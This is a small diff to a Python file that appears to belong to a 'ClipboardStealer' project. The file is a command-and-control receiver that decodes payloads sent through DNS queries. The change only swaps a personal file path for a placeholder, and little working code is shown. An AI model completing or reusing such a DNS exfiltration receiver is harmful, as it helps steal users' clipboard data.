@@ -3,7 +3,7 @@ import socket
 from dnslib import DNSRecord, QTYPE
 import datetime
 
-file_path = r'C:\Users\mhmd_\NewDrive\OneDrive\Desktop\pythonProject3\ClipboardStealer\C2Data\output.txt'
+file_path = r'Set_your_filepath_here'
 # Function to decode the payload from DNS queries
 
 def receive_data():
